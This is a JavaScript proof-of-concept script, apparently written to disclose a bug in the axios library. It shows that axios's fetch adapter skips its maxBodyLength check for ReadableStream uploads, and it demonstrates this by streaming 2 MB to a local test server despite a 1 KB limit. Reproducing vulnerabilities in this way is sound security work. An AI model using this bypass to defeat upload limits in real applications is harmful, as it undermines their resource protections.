// PoC: fetch adapter ReadableStream uploads bypass `maxBodyLength` enforcement.
//
// Threat model:
//   The application uses axios's fetch adapter (Node 18+, browsers, edge
//   runtimes, etc.) and forwards a live `ReadableStream` body — for example,
//   piping an upstream upload through axios. It relies on `maxBodyLength` to
//   bound outbound transmission.
//
// Expected behavior:
//   axios should reject the request (or at least abort transmission) once
//   the streamed body exceeds `maxBodyLength`, matching the HTTP/1 native
//   adapter's behavior.
//
// Observed behavior on axios v1.16.1:
//   - lib/adapters/fetch.js:121 — getBodyLength() has no branch for live
//     ReadableStream bodies, so their size is reported as undefined.
//   - lib/adapters/fetch.js:151 — resolveBodyLength() returns undefined when
//     no Content-Length header is set and the length cannot be inferred.
//   - lib/adapters/fetch.js:218 — the pre-dispatch `maxBodyLength` check
//     only rejects when `outboundLength` is a finite number, so it is
//     skipped for unknown-length stream bodies.
//   - lib/adapters/fetch.js:259 — the upload-progress wrapper that runs
//     during transmission only tracks bytes for progress events; it never
//     enforces a byte limit.
//
// Run:
//   node research/repros/fetch_stream_maxbody_bypass.mjs

import http from 'node:http';
import axios from '../../index.js';

const LIMIT = 1024;
const PAYLOAD_BYTES = 2 * 1024 * 1024;

const server = http.createServer((req, res) => {
  let received = 0;
  req.on('data', (chunk) => {
    received += chunk.length;
  });
  req.on('end', () => {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ received, limit: LIMIT }));
  });
  req.on('error', () => {
    /* swallow client-side aborts */
  });
});

await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const port = server.address().port;

function makeReadableStream(totalBytes) {
  const CHUNK = new Uint8Array(64 * 1024).fill(0x42);
  let remaining = totalBytes;
  return new ReadableStream({
    pull(controller) {
      if (remaining <= 0) {
        controller.close();
        return;
      }
      const next = remaining >= CHUNK.length ? CHUNK : CHUNK.subarray(0, remaining);
      remaining -= next.length;
      controller.enqueue(next);
    },
  });
}

try {
  let result;
  try {
    const response = await axios.post(
      `http://127.0.0.1:${port}/upload`,
      makeReadableStream(PAYLOAD_BYTES),
      {
        adapter: 'fetch',
        maxBodyLength: LIMIT,
        headers: { 'content-type': 'application/octet-stream' },
        // No content-length: the stream's total length is unknown ahead of
        // dispatch, which is exactly the vulnerable code path.
      }
    );
    result = { status: response.status, data: response.data };
  } catch (err) {
    result = { error: err && (err.code || err.message) };
  }

  console.log('--- PoC: fetch adapter ReadableStream maxBodyLength bypass ---');
  console.log('axios result:', JSON.stringify(result));

  const ok =
    result &&
    result.status === 200 &&
    result.data &&
    typeof result.data === 'object' &&
    result.data.received === PAYLOAD_BYTES &&
    result.data.limit === LIMIT;

  if (ok) {
    console.log(
      `VULNERABLE: server received ${result.data.received} bytes despite ` +
        `maxBodyLength=${LIMIT}.`
    );
    process.exitCode = 0;
  } else {
    console.log('NOT VULNERABLE: axios refused or truncated the oversized ReadableStream.');
    process.exitCode = 1;
  }
} finally {
  server.close();
}
